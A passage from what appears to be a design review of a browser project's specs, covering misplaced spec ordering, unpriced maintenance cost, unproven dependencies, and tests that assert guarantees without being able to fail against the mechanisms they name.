For fairness, the ones that clearly *are* personal daily use: r1, r3, r4 (two are day-1 friction-log entries with citations), x3 (reverses a cut on logged evidence), r2, p1, p2, p3, d3, a3.

64. **x3 is one version too late.** r3, r4 and r5 all specify their filtering against it ("substring until then"), so building v1.2.0 without it means writing ranking and highlight twice. It's also the smallest, most self-contained spec in v1.3.0 and the only one with logged day-1 evidence. → move into v1.2.0.

65. **The per-spec tax nobody priced.** 27 TOML sections and ~120 leaves by v2.1; r5's SCHEMA alone reaches ~720 lines of data, every description lexicon-swept. 107 registry commands, each needing description + risk class + agent flag + sweep + REGISTRY assertion. And a1 retrofits `agent: false` into the entry shape x1 *froze* — with no spec bumping `aether.version`. → state the tax in the build matrix; amend x1 now to include `agent` in the entry shape.

66. **Three unproven dependencies.** d6's spike tests the wrong thing (filter registration works — it's the substrate of `browser.proxy.onRequest`; the hard part is attribution coverage and whether traffic can be made to *fail*). d5 is honestly flagged and wrongly answered. a1's MCP transport means the browser *listens* on a socket, which d1 never permits and whose "no general RPC endpoint" non-goal it arguably violates.

---

## Recurring pattern, named once

**The guarantees are real design intent; the tests assert the guarantees rather than exercise the mechanisms.** Several would go green on day one against a broken implementation:

- r1 test 13 passes against the *existing* page-reload command
- r3 visual test 4 proves the opposite of its claim
- d3 scenario 7 tests shell injection (defeated by argv) while DSL injection is wide open
- d4 test 14 replays a clean reconnect, not the crash that duplicates
- d4 test 4's assertion is identical under both definitions of the number it pins
- d4 test 5's export inventory is blind to internal mutation
- d2 test 12 grades the daemon's own refcount
- p2 visual test 5 uses a fixture that was never bookmarked, so it can't see the bookmarked-page bug
- r4's tests all pass with the panel unable to receive a keystroke

For a repo whose quality claim is "every behavioral claim is test-proven", this is the most expensive failure mode available. Worth a convention: **a test must be able to fail against the specific mechanism it names.**
